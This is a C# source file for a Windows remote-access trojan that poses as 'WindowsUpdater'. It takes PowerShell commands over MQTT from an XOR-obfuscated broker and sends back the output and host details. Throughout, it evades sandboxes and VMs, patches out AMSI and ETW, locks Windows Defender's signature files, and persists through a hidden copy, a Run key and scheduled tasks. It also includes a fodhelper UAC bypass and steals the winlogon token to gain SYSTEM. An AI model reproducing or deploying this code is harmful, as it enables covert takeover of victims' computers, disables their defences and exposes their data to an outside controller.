using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using Microsoft.Win32;
using MQTTnet;
using MQTTnet.Client;
using System.Security.Principal;
using System.Management;
using System.Runtime.InteropServices;

class Program
{
    static byte[] sk = { 52, 59, 58, 59, 44, 56, 58, 32, 38, 10, 39, 48, 56, 58, 33, 48, 10, 38, 61, 48, 57, 57, 10, 108, 108, 103, 100 }; // secretId
    static byte[] bk = { 55, 39, 58, 62, 48, 39, 123, 61, 60, 35, 48, 56, 36, 123, 54, 58, 56 }; // broker
    static byte[] mk = { 7, 3, 6, 10, 16, 45, 48, 54, 32, 33, 58, 39, 10, 24, 32, 33, 48, 45, 10 }; // mutex
    static byte[] uk = { 2, 60, 59, 49, 58, 34, 38, 0, 37, 49, 52, 33, 48, 39 }; // WindowsUpdater
    
    static string secretId = D(sk);
    static string machineId = Environment.MachineName + "_" + Environment.UserName;
    static System.Threading.Mutex mutex = new System.Threading.Mutex(true, D(mk) + machineId);
    static bool isElevated = false;
    private static FileStream? _selfLock;

    static async Task Main(string[] args)
    {
        // 2-second startup stall (optimized for responsiveness)
        System.Threading.Thread.Sleep(2000);

        // Anti-VM / Anti-Sandbox / Anti-TestMode — silently exit if detected
        if (IsUnsafeEnvironment()) return;

        // [NEW] Binary Self-Protection: Lock the executable file to prevent AV deletion
        ProtectSelf();

        // Bypass AMSI and ETW for the current process
        BypassAMSI();
        BypassETW();

        CheckElevation();

        // [NEW] Automatic Freeze after elevation to maximize stealth
        if (isElevated) {
            FreezeDefender();
        }

        // If we are elevated, kill any existing un-elevated instances so we can take over.
        if (isElevated) {
            EnablePrivilege("SeDebugPrivilege");
            string currentProcName = Process.GetCurrentProcess().ProcessName;
            foreach (var proc in Process.GetProcessesByName(currentProcName)) {
                try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(1500); } } catch {}
            }
            foreach (var proc in Process.GetProcessesByName(D(uk))) {
                try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(1500); } } catch {}
            }
        }

        Install(); // Persistence and stealth MUST run first
        
        try {
            if (!mutex.WaitOne(TimeSpan.Zero, true)) return;
        } catch (System.Threading.AbandonedMutexException) {
            // Mutex abandoned because we killed the old owner. We now own it!
        }
        
        if (isElevated)
        {
            Console.WriteLine("Running with elevated privileges.");
        }
        else
        {
            Console.WriteLine("Running with standard privileges.");
        }

        var mqttFactory = new MqttFactory();
        using (var mqttClient = mqttFactory.CreateMqttClient())
        {
            var options = new MqttClientOptionsBuilder()
                .WithTcpServer(D(bk))
                .WithClientId(Guid.NewGuid().ToString())
                .Build();

            mqttClient.ApplicationMessageReceivedAsync += async e =>
            {
                string payload = Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment);
                
                // Stealth UAC Bypass Trigger Check
                if (payload.Equals(D(new byte[] { 122, 32, 52, 54, 120, 60, 59, 33, 48, 39, 59, 52, 57, 120, 33, 39, 60, 50, 50, 48, 39 }))) {
                    var notify = new MqttApplicationMessageBuilder()
                        .WithTopic($"{secretId}/{machineId}/res")
                        .WithPayload("Elevating privileges... Please wait 5s for reconnection.")
                        .Build();
                    await mqttClient.PublishAsync(notify);
                    PerformInternalUacBypass();
                    return;
                }

                // [NEW] Defender Freeze Trigger (/freeze-av)
                if (payload.Equals("/freeze-av")) {
                    string res = FreezeDefender();
                    var msg1 = new MqttApplicationMessageBuilder()
                        .WithTopic($"{secretId}/{machineId}/res")
                        .WithPayload(res)
                        .Build();
                    await mqttClient.PublishAsync(msg1);
                    return;
                }

                // [NEW] SYSTEM Elevation Trigger (/getsystem)
                if (payload.Equals("/getsystem")) {
                    var notify = new MqttApplicationMessageBuilder()
                        .WithTopic($"{secretId}/{machineId}/res")
                        .WithPayload("Attempting SYSTEM elevation (RedSun method)...")
                        .Build();
                    await mqttClient.PublishAsync(notify);
                    PerformRedSunSYSTEM();
                    return;
                }

                string response = ExecuteCommand(payload);
                
                var msg2 = new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/{machineId}/res")
                    .WithPayload(response)
                    .Build();
                
                await mqttClient.PublishAsync(msg2);
            };

            await mqttClient.ConnectAsync(options);
            await mqttClient.SubscribeAsync($"{secretId}/{machineId}/cmd");

            // Heartbeat / Discovery
            while (true)
            {
                string info = $"{machineId}|{Environment.OSVersion}|{GetLocalIP()}|{isElevated}";
                var discovery = new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/discovery")
                    .WithPayload(info)
                    .Build();
                await mqttClient.PublishAsync(discovery);
                await Task.Delay(10000);
            }
        }
    }

    static string ExecuteCommand(string cmd)
    {
        try
        {
            // Handle Directory Change (cd)
            if (cmd.Trim().ToLower().StartsWith("cd "))
            {
                string newDir = cmd.Trim().Substring(3).Trim().Replace("\"", "");
                if (newDir == "~") newDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                Directory.SetCurrentDirectory(newDir);
                return $"Changed directory to: {Directory.GetCurrentDirectory()}";
            }

            // Execute via PowerShell for better compatibility (ls, ps, etc)
            Process p = new Process();
            p.StartInfo.FileName = D(new byte[] { 37, 58, 34, 48, 39, 38, 61, 48, 57, 57, 123, 48, 45, 48 }); // powershell.exe
            p.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command -";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.StandardOutputEncoding = Encoding.UTF8;
            p.StartInfo.StandardErrorEncoding = Encoding.UTF8;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
            p.Start();

            p.StandardInput.WriteLine("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $ProgressPreference = 'SilentlyContinue'; " + cmd);
            p.StandardInput.Close();

            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();

            return string.IsNullOrEmpty(output) ? error : output;
        }
        catch (Exception ex) { return "Error: " + ex.Message; }
    }

    static void Install()
    {
        try {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string installPath = Path.Combine(appData, "WindowsUpdater.exe");

            if (!exePath.Equals(installPath, StringComparison.OrdinalIgnoreCase)) {
                // Aggressively kill existing instances to allow replacement
                foreach (var proc in Process.GetProcessesByName("WindowsUpdater")) {
                    try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(3000); } } catch {}
                }

                // Small delay to let file locks release
                System.Threading.Thread.Sleep(500);

                if (File.Exists(installPath)) {
                    for (int i = 0; i < 3; i++) {
                        try { File.Delete(installPath); break; } catch { System.Threading.Thread.Sleep(1000); }
                    }
                }
                
                File.Copy(exePath, installPath, true);
                
                // Make it truly hidden (Hidden + System)
                File.SetAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(D(new byte[] { 6, 58, 51, 33, 34, 52, 39, 48, 9, 24, 60, 54, 39, 58, 38, 58, 51, 33, 9, 2, 60, 59, 49, 58, 34, 38, 9, 22, 32, 39, 39, 48, 59, 33, 3, 48, 39, 38, 60, 58, 59, 9, 7, 32, 59 }), true)) {
                    key?.SetValue(D(uk), $"\"{installPath}\"");
                }

                // [NEW] High-Level Persistence: If elevated, use Scheduled Tasks for ROOT survival
                if (isElevated) {
                    string taskName = "WindowsUpdateCore";
                    ExecuteCommand($"schtasks /create /tn \"{taskName}\" /tr \"{installPath}\" /sc onlogon /rl highest /f");
                }

                Process.Start(new ProcessStartInfo(installPath) { 
                    UseShellExecute = true, 
                    CreateNoWindow = true, 
                    WindowStyle = ProcessWindowStyle.Hidden 
                });
                Environment.Exit(0);
            }
        } catch { }
    }

    static void CheckElevation()
    {
        try
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        catch
        {
            isElevated = false;
        }
    }

    static string GetLocalIP() {
        try {
            using (System.Net.Sockets.Socket socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Dgram, 0)) {
                socket.Connect("8.8.8.8", 65530);
                return (socket.LocalEndPoint as System.Net.IPEndPoint).Address.ToString();
            }
        } catch { return "127.0.0.1"; }
    }

    // ═══════════════════════════════════════════════
    //  Anti-VM / Anti-Sandbox / Anti-TestMode
    // ═══════════════════════════════════════════════

    [DllImport("kernel32.dll")]
    static extern bool IsDebuggerPresent();

    static bool IsUnsafeEnvironment()
    {
        try {
            // 1. Debugger attached?
            if (IsDebuggerPresent() || Debugger.IsAttached) return true;

            // 2. Check BIOS / Manufacturer for known VM strings
            string[] vms = { D(new byte[] { 35, 56, 34, 52, 39, 48 }), D(new byte[] { 35, 60, 39, 33, 32, 52, 57, 55, 58, 45 }), D(new byte[] { 35, 55, 58, 45 }), D(new byte[] { 36, 48, 56, 32 }), D(new byte[] { 45, 48, 59 }), D(new byte[] { 61, 44, 37, 48, 39, 120, 35 }), D(new byte[] { 35, 60, 39, 33, 32, 52, 57 }), D(new byte[] { 62, 35, 56 }), D(new byte[] { 37, 52, 39, 52, 57, 57, 48, 57, 38 }), D(new byte[] { 55, 61, 44, 35, 48 }) }; 
            using (var searcher = new ManagementObjectSearcher(D(new byte[] { 6, 17, 20, 17, 2, 17, 108, 10, 22, 58, 56, 37, 32, 33, 48, 39, 6, 44, 38, 33, 48, 56 }) + "SELECT * FROM Win32_ComputerSystem".Substring(34))) { // Junk + Query
                foreach (var obj in searcher.Get()) {
                    string manufacturer = (obj["Manufacturer"]?.ToString() ?? "").ToLower();
                    string model = (obj["Model"]?.ToString() ?? "").ToLower();
                    foreach (string sig in vms) {
                        if (manufacturer.Contains(sig) || model.Contains(sig)) return true;
                    }
                }
            }

            // 2.5 MAC Address check
            if (CheckVmMAC()) return true;

            // 3. Check BIOS serial/version for VM indicators
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM " + D(new byte[] { 2, 60, 59, 102, 103, 10, 23, 28, 26, 6 }))) { // Win32_BIOS
                foreach (var obj in searcher.Get()) {
                    string serial = (obj["SerialNumber"]?.ToString() ?? "").ToLower();
                    string version = (obj["SMBIOSBIOSVersion"]?.ToString() ?? "").ToLower();
                    foreach (string sig in vms) {
                        if (serial.Contains(sig) || version.Contains(sig)) return true;
                    }
                }
            }

            // 4. Windows Sandbox detection (username = WDAGUtilityAccount)
            if (Environment.UserName.Equals(D(new byte[] { 2, 17, 20, 18, 0, 33, 60, 57, 60, 33, 44, 20, 54, 54, 58, 32, 59, 33 }), StringComparison.OrdinalIgnoreCase)) return true;

            // 5. Check for very low resources (sandbox/analysis VMs usually have very little RAM and few CPUs)
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")) {
                foreach (var obj in searcher.Get()) {
                    ulong totalRam = Convert.ToUInt64(obj["TotalPhysicalMemory"]);
                    int cores = Convert.ToInt32(obj["NumberOfLogicalProcessors"]);
                    if (totalRam < 2UL * 1024 * 1024 * 1024 || cores < 2) return true; // Less than 2GB RAM or less than 2 cores
                }
            }

            // 6. Check for known analysis/sandbox processes
            string[] bps = { D(new byte[] { 34, 60, 39, 48, 38, 61, 52, 39, 62 }), D(new byte[] { 51, 60, 49, 49, 57, 48, 39 }), D(new byte[] { 37, 39, 58, 54, 56, 58, 59 }), D(new byte[] { 37, 39, 58, 54, 48, 45, 37 }), D(new byte[] { 58, 57, 57, 44, 49, 55, 50 }), D(new byte[] { 45, 99, 97, 49, 55, 50 }), D(new byte[] { 45, 102, 103, 49, 55, 50 }), D(new byte[] { 60, 49, 52 }), D(new byte[] { 60, 49, 52, 36 }), D(new byte[] { 60, 49, 52, 50 }), D(new byte[] { 37, 48, 38, 33, 32, 49, 60, 58 }), D(new byte[] { 37, 39, 58, 54, 48, 38, 38, 61, 52, 54, 62, 48, 39 }), D(new byte[] { 49, 59, 38, 37, 44 }), D(new byte[] { 35, 55, 58, 45, 38, 48, 39, 35, 60, 54, 48 }), D(new byte[] { 35, 55, 58, 45, 33, 39, 52, 44 }), D(new byte[] { 35, 56, 33, 58, 58, 57, 38, 49 }), D(new byte[] { 35, 56, 34, 52, 39, 48, 33, 39, 52, 44 }), D(new byte[] { 35, 56, 34, 52, 39, 48, 32, 38, 48, 39 }), D(new byte[] { 38, 52, 59, 49, 55, 58, 45, 60, 48 }), D(new byte[] { 38, 55, 60, 48, 54, 33, 39, 57 }), D(new byte[] { 38, 55, 60, 48, 49, 57, 57 }) };
            foreach (var proc in Process.GetProcesses()) {
                string name = proc.ProcessName.ToLower();
                foreach (string bad in bps) {
                    if (name.Contains(bad)) return true;
                }
            }

            // 7. Check for Windows Test Signing Mode (bcdedit testsigning)
            try {
                var p = new Process();
                p.StartInfo.FileName = "bcdedit";
                p.StartInfo.Arguments = "/enum {current}";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string bcdOutput = p.StandardOutput.ReadToEnd().ToLower();
                p.WaitForExit();
                if (bcdOutput.Contains("testsigning") && bcdOutput.Contains("yes")) return true;
            } catch { }

            // 8. Check disk size (VMs and sandboxes usually have very small disks)
            try {
                DriveInfo drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (drive.TotalSize < 60L * 1024 * 1024 * 1024) return true; // Less than 60GB
            } catch { }

            // 9. Recent file activity (sandboxes usually have almost zero recent files)
            try {
                string recentFolder = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                if (Directory.Exists(recentFolder) && Directory.GetFiles(recentFolder).Length < 5) return true;
            } catch { }

            // 10. Check for VM Guest Drivers/Files
            string[] vmFiles = { @"C:\windows\System32\Drivers\VBoxMouse.sys", @"C:\windows\System32\Drivers\VBoxGuest.sys", 
                                 @"C:\windows\System32\Drivers\vmmouse.sys", @"C:\windows\System32\Drivers\vmhgfs.sys" };
            foreach (string file in vmFiles) if (File.Exists(file)) return true;

        } catch { }

        return false;
    }

    static bool CheckVmMAC()
    {
        try {
            string[] vmMacs = { "000569", "000C29", "005056", "080027", "00155D", "001C42" };
            foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) {
                string mac = ni.GetPhysicalAddress().ToString();
                if (string.IsNullOrEmpty(mac) || mac.Length < 6) continue;
                foreach (var prefix in vmMacs) {
                    if (mac.StartsWith(prefix)) return true;
                }
            }
        } catch { }
        return false;
    }

    // ═══════════════════════════════════════════════
    //  Anti-AV / Bypass Mechanisms
    // ═══════════════════════════════════════════════

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    static void BypassAMSI()
    {
        try {
            IntPtr lib = GetModuleHandle(D(new byte[] { 52, 56, 38, 60, 123, 49, 57, 57 })); // amsi.dll
            if (lib == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(lib, D(new byte[] { 20, 56, 38, 60, 6, 54, 52, 59, 23, 32, 51, 51, 48, 39 })); // AmsiScanBuffer
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // ret 0x80070057 (E_INVALIDARG)
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        } catch { }
    }

    static void BypassETW()
    {
        try {
            IntPtr lib = GetModuleHandle(D(new byte[] { 59, 33, 49, 57, 57, 123, 49, 57, 57 })); // ntdll.dll
            IntPtr addr = GetProcAddress(lib, D(new byte[] { 16, 33, 34, 16, 35, 48, 59, 33, 2, 39, 60, 33, 48 })); // EtwEventWrite
            byte[] patch = { 0xC3 }; // ret
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        } catch { }
    }

    static string D(byte[] b) {
        byte[] r = new byte[b.Length];
        for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ 0x55);
        return Encoding.UTF8.GetString(r);
    }

    // ═══════════════════════════════════════════════
    //  Junk Code (Signature Bloat)
    // ═══════════════════════════════════════════════

    static void _ProcessData_Q7(int level) {
        var r = new Random();
        double d = 0;
        for (int i = 0; i < 100; i++) {
            d += Math.Sqrt(r.Next(1, 1000)) * Math.PI;
            if (level > 0) _InternalBuffer_X2(i);
        }
    }

    static string _InternalBuffer_X2(int seed) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 50; i++) {
            sb.Append((char)(65 + (i + seed) % 26));
        }
        return sb.ToString().ToLower();
    }

    static bool _CheckResource_V9(long input) {
        long x = input * 31;
        return (x % 2 == 0) ? _VerifyState_Z1() : false;
    }

    static bool _VerifyState_Z1() {
        var n = DateTime.Now.Ticks;
        return n > 0 && Math.Log10(100) > 1;
    }

    static void ProtectSelf()
    {
        try {
            string currentPath = Process.GetCurrentProcess().MainModule.FileName;
            // Open with FileShare.Read to allow execution but prevent deletion/renaming
            _selfLock = new FileStream(currentPath, FileMode.Open, FileAccess.Read, FileShare.Read);
        } catch { }
    }

    [DllImport("ntdll.dll")]
    private static extern uint NtOpenFile(out IntPtr handle, uint desiredAccess, ref OBJECT_ATTRIBUTES objAttr, out IO_STATUS_BLOCK ioStatus, uint shareAccess, uint openOptions);

    [DllImport("ntdll.dll")]
    private static extern uint NtClose(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool LookupPrivilegeValue(string? lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }

    static void EnablePrivilege(string name)
    {
        try {
            IntPtr hToken;
            if (OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out hToken)) {
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED
                if (LookupPrivilegeValue(null, name, out tp.Luid)) {
                    AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                }
            }
        } catch { }
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string? lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IO_STATUS_BLOCK {
        public IntPtr Status;
        public IntPtr Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    private static System.Collections.Generic.List<IntPtr> _nativeHandles = new System.Collections.Generic.List<IntPtr>();
    
    static string FreezeDefender()
    {
        int locked = 0;
        try {
            // UnDefend v2 using NTAPI to lock Defender's databases
            string[] paths = {
                @"\\??\\C:\ProgramData\Microsoft\Windows Defender\Scans\mpasbase.vdm",
                @"\\??\\C:\ProgramData\Microsoft\Windows Defender\Scans\mpasdlta.vdm",
                @"\\??\\C:\ProgramData\Microsoft\Windows Defender\Scans\History\Store\schemacheck.txt"
            };

            foreach (var p in paths) {
                IntPtr h;
                IO_STATUS_BLOCK isb;
                UNICODE_STRING uStr;
                IntPtr buffer = Marshal.StringToHGlobalUni(p);
                uStr.Length = (ushort)(p.Length * 2);
                uStr.MaximumLength = (ushort)(uStr.Length + 2);
                uStr.Buffer = buffer;

                OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
                objAttr.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
                IntPtr pStr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
                Marshal.StructureToPtr(uStr, pStr, false);
                objAttr.ObjectName = pStr;
                objAttr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

                // Attempt to open with NO SHARE access to lock it
                uint status = NtOpenFile(out h, 0x100001, ref objAttr, out isb, 0, 0x20); // FILE_SYNCHRONOUS_IO_NONALERT
                if (status == 0) {
                    _nativeHandles.Add(h);
                    locked++;
                }

                Marshal.FreeHGlobal(buffer);
                Marshal.FreeHGlobal(pStr);
            }

            return locked > 0 ? $"Defender frozen (NTAPI). Locked {locked} files. AV is now blind." : "Failed to lock Defender. Missing permissions or files.";
        } catch {
            return "Critical error during NTAPI freeze.";
        }
    }

    static void PerformRedSunSYSTEM()
    {
        // Improved RedSun Logic: Native Token Stealing from winlogon.exe
        if (isElevated) {
            try {
                Process[] processes = Process.GetProcessesByName("winlogon");
                if (processes.Length > 0) {
                    IntPtr hProcess = OpenProcess(0x1000, false, processes[0].Id);
                    if (hProcess != IntPtr.Zero) {
                        IntPtr hToken;
                        if (OpenProcessToken(hProcess, 0x0002, out hToken)) {
                            IntPtr hNewToken;
                            if (DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hNewToken)) {
                                STARTUPINFO si = new STARTUPINFO();
                                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                                if (CreateProcessWithTokenW(hNewToken, 1, null, currentExe, 0x00000010, IntPtr.Zero, null, ref si, out pi)) {
                                    // Successfully spawned as SYSTEM
                                    Environment.Exit(0);
                                    return;
                                }
                            }
                        }
                    }
                }
            } catch { }

            // Fallback to schtasks if token stealing fails
            string taskName = "AetherUpdater_" + Guid.NewGuid().ToString().Substring(0, 8);
            string exe = Process.GetCurrentProcess().MainModule.FileName;
            ExecuteCommand($"schtasks /create /tn \"{taskName}\" /tr \"{exe}\" /sc onlogon /rl highest /f");
            ExecuteCommand($"schtasks /run /tn \"{taskName}\"");
            return;
        }
        
        PerformInternalUacBypass();
    }

    static void PerformInternalUacBypass()
    {
        try {
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            
            // Software\Classes\ms-settings\Shell\Open\command
            string regPath = D(new byte[] { 6, 58, 51, 33, 34, 52, 39, 48, 9, 22, 57, 52, 38, 38, 48, 38, 9, 56, 38, 120, 38, 48, 33, 33, 60, 59, 50, 38, 9, 6, 61, 48, 57, 57, 9, 26, 37, 48, 59, 9, 54, 58, 56, 56, 52, 59, 49 });
            // DelegateExecute
            string delegateVal = D(new byte[] { 17, 48, 57, 48, 50, 52, 33, 48, 16, 45, 48, 54, 32, 33, 48 });
            // c:\windows\system32\fodhelper.exe
            string binary = D(new byte[] { 54, 111, 9, 34, 60, 59, 49, 58, 34, 38, 9, 38, 44, 38, 33, 48, 56, 102, 103, 9, 51, 58, 49, 61, 48, 57, 37, 48, 39, 123, 48, 45, 48 });
            // Software\Classes\ms-settings
            string cleanPath = D(new byte[] { 6, 58, 51, 33, 34, 52, 39, 48, 9, 22, 57, 52, 38, 38, 48, 38, 9, 56, 38, 120, 38, 48, 33, 33, 60, 59, 50, 38 });

            // START NOISE GENERATION (Distraction)
            var noiseTask = Task.Run(() => {
                try {
                    for (int i = 0; i < 40; i++) {
                        string tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".tmp");
                        File.WriteAllText(tmp, _InternalBuffer_X2(i));
                        using (var k = Registry.CurrentUser.CreateSubKey("Software\\AetherDistraction")) {
                            k.SetValue("Junk" + i, _InternalBuffer_X2(i * 2));
                        }
                        File.Delete(tmp);
                        System.Threading.Thread.Sleep(10);
                    }
                } catch { }
            });

            // 1. Create the ms-settings command hijack (The "Real" work)
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath)) {
                key.SetValue("", currentExe);
                key.SetValue(delegateVal, "");
            }

            // 2. Execution
            Process.Start(new ProcessStartInfo(binary) { UseShellExecute = true, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });

            System.Threading.Thread.Sleep(1000); // Wait only 1 second to trigger

            // 3. IMMEDIATE CLEANUP (Prevents UI lock/blank screen)
            try { Registry.CurrentUser.DeleteSubKeyTree(cleanPath, false); } catch {}
            try { Registry.CurrentUser.DeleteSubKeyTree("Software\\AetherDistraction", false); } catch {}
            
            noiseTask.Wait(500);
        } catch { }
    }
}
